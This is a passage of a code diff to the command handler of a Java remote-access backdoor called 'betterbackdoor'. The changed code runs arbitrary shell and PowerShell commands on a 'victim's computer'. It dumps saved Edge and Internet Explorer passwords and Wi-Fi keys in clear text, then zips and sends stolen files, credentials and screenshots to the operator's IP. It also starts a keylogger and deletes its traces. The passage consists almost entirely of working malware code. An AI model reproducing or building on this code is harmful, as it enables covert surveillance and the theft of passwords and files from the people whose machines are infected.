@@ -1,19 +1,23 @@
 package com.thatcherdev.betterbackdoor.backdoor;
 
-import java.util.Scanner;
-import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
+import java.awt.datatransfer.DataFlavor;
 import java.io.File;
+import java.io.IOException;
 import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Scanner;
+
 import javax.imageio.ImageIO;
+
 import com.thatcherdev.betterbackdoor.backend.DuckyScripts;
 import com.thatcherdev.betterbackdoor.backend.FTP;
 import com.thatcherdev.betterbackdoor.backend.KeyLogger;
 import com.thatcherdev.betterbackdoor.backend.Utils;
+
 import org.apache.commons.io.FileUtils;
 
 public class HandleCommand {
@@ -39,53 +43,95 @@ public class HandleCommand {
 					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
 		else if (command.startsWith("cmd"))
 			send = Utils.runCommand(command.substring(4));
-		else if (command.startsWith("ps") || command.startsWith("ds"))
+		else if (command.startsWith("ps") || command.startsWith("ds")) {
+			File file = new File(command.substring(3));
 			try {
-				File file = new File(command.substring(3));
 				if (command.startsWith("ps") && file.exists())
 					send = Utils.runPSScript(command.substring(3));
 				else if (command.startsWith("ds") && file.exists() && DuckyScripts.run(command.substring(3)))
 					send = "DuckyScript successfully executed";
 				else
 					throw new Exception();
-				FileUtils.forceDelete(file);
 			} catch (Exception e) {
 				send = "An error occurred when trying to execute script";
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
+			} finally {
+				try {
+					FileUtils.forceDelete(file);
+				} catch (Exception e) {
+				}
 			}
-		else if (command.startsWith("exfiles"))
+		} else if (command.startsWith("exfiles")) {
+			File exfiltratedFiles = new File(Backdoor.gatheredDir + "ExfiltratedFiles");
 			try {
 				Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
 						new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
-				send = "Files exfiltrated to '" + Backdoor.gatheredDir + "ExfiltratedFiles' on victim's computer";
+				Utils.zipDir(exfiltratedFiles.getAbsolutePath());
+				FTP.backdoor(exfiltratedFiles.getAbsolutePath() + ".zip", "send", Backdoor.ip);
+				while (!FTP.socketTransferDone && FTP.error == null)
+					Thread.sleep(10);
+				if (FTP.socketTransferDone)
+					FTP.socketTransferDone = false;
+				if (FTP.error != null) {
+					String error = FTP.error;
+					FTP.error = null;
+					throw new Exception(error);
+				}
+				send = "Files exfiltrated";
 			} catch (Exception e) {
 				send = "An error occurred when trying to exfiltrate files";
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
+			} finally {
+				try {
+					FileUtils.forceDelete(exfiltratedFiles);
+					FileUtils.forceDelete(new File(exfiltratedFiles.getAbsolutePath() + ".zip"));
+				} catch (Exception e) {
+				}
 			}
-		else if (command.equals("expass"))
+		} else if (command.equals("expass")) {
+			File exfiltratedPasswords = new File(Backdoor.gatheredDir + "ExfiltratedPasswords");
 			try {
-				File exfilBrowserCreds = new File("ExfilBrowserCreds.ps1");
-				PrintWriter out = new PrintWriter(exfilBrowserCreds);
-				out.println("$filename=$PSScriptRoot+\"" + Backdoor.gatheredDir + "BrowserPasswords.txt\"\n"
+				exfiltratedPasswords.mkdir();
+				File exfilBrowserCredsScript = new File(
+						exfiltratedPasswords.getAbsolutePath() + File.separator + "ExfilBrowserCreds.ps1");
+				PrintWriter out = new PrintWriter(exfilBrowserCredsScript);
+				out.println("$filename=$PSScriptRoot+\"\\BrowserPasswords.txt\"\n"
 						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
 						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
 						+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
-						+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n"
-						+ "echo \"Microsoft Edge and Internet Explorer passwords exfiltrated to '$filename' on vitim's computer\"\n"
-						+ "exit");
+						+ "$creds | Format-List -Property Resource,UserName,Password | Out-File $filename\n" + "exit");
 				out.flush();
 				out.close();
-				send += Utils.runPSScript(exfilBrowserCreds.getAbsolutePath()) + "\n";
-				send += Utils.runCommand("netsh wlan export profile key=clear folder=" + Backdoor.gatheredDir);
-				FileUtils.forceDelete(exfilBrowserCreds);
+				Utils.runPSScript(exfilBrowserCredsScript.getAbsolutePath());
+				Utils.runCommand(
+						"netsh wlan export profile key=clear folder=" + exfiltratedPasswords.getAbsolutePath());
+				FileUtils.forceDelete(exfilBrowserCredsScript);
+				Utils.zipDir(exfiltratedPasswords.getAbsolutePath());
+				FTP.backdoor(exfiltratedPasswords.getAbsolutePath() + ".zip", "send", Backdoor.ip);
+				while (!FTP.socketTransferDone && FTP.error == null)
+					Thread.sleep(10);
+				if (FTP.socketTransferDone)
+					FTP.socketTransferDone = false;
+				if (FTP.error != null) {
+					String error = FTP.error;
+					FTP.error = null;
+					throw new Exception(error);
+				}
+				send = "Passwords exfiltrated";
 			} catch (Exception e) {
 				send = "An error occurred when trying to exfiltrate passwords";
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
+			} finally {
+				try {
+					FileUtils.forceDelete(exfiltratedPasswords);
+					FileUtils.forceDelete(new File(exfiltratedPasswords.getAbsolutePath() + ".zip"));
+				} catch (Exception e) {
+				}
 			}
-		else if (command.startsWith("filetype")) {
+		} else if (command.startsWith("filetype")) {
 			File file = new File(command.substring(9));
 			if (file.isFile())
 				send = "file";
@@ -111,9 +157,9 @@ public class HandleCommand {
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
-		} else if (command.startsWith("filerec"))
+		} else if (command.startsWith("filerec")) {
+			File file = new File(command.substring(8));
 			try {
-				File file = new File(command.substring(8));
 				if (file.isFile())
 					FTP.backdoor(file.getAbsolutePath(), "send", Backdoor.ip);
 				else if (file.isDirectory()) {
@@ -130,40 +176,54 @@ public class HandleCommand {
 					FTP.error = null;
 					throw new Exception(error);
 				}
-				if (file.isDirectory())
-					FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
 				send = "File received";
 			} catch (Exception e) {
 				send = "An error occurred when trying to receive file";
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
+			} finally {
+				try {
+					if (file.isDirectory())
+						FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
+				} catch (Exception e) {
+				}
 			}
-		else if (command.equals("keylog")) {
+		} else if (command.startsWith("keylog")) {
 			Thread keyLogger = new Thread() {
 				public void run() {
-					KeyLogger.start();
+					KeyLogger.start(command.substring(7));
 				}
 			};
 			keyLogger.start();
-			send = "Keys are being logged to '" + Backdoor.gatheredDir + "keys.log' on victim's computer";
-		} else if (command.equals("ss"))
+			send = "Keys are being logged to '" + command.substring(7) + "\\keys.log' on victim's computer";
+		} else if (command.equals("ss")) {
+			File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
 			try {
-				File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
 				ImageIO.write(
 						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
 						"png", screenshot);
 				FTP.backdoor(screenshot.getAbsolutePath(), "send", Backdoor.ip);
-				while (!FTP.socketTransferDone)
+				while (!FTP.socketTransferDone && FTP.error == null)
 					Thread.sleep(10);
-				FTP.socketTransferDone = false;
-				FileUtils.forceDelete(screenshot);
+				if (FTP.socketTransferDone)
+					FTP.socketTransferDone = false;
+				if (FTP.error != null) {
+					String error = FTP.error;
+					FTP.error = null;
+					throw new Exception(error);
+				}
 				send = "Screenshot received";
 			} catch (Exception e) {
-				send = "An error occurred when trying to received screenshot";
+				send = "An error occurred when trying to receive screenshot";
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
+			} finally {
+				try {
+					FileUtils.forceDelete(screenshot);
+				} catch (IOException e) {
+				}
 			}
-		else if (command.equals("cb"))
+		} else if (command.equals("cb"))
 			try {
 				String clipBoard = (String) Toolkit.getDefaultToolkit().getSystemClipboard()
 						.getData(DataFlavor.stringFlavor);
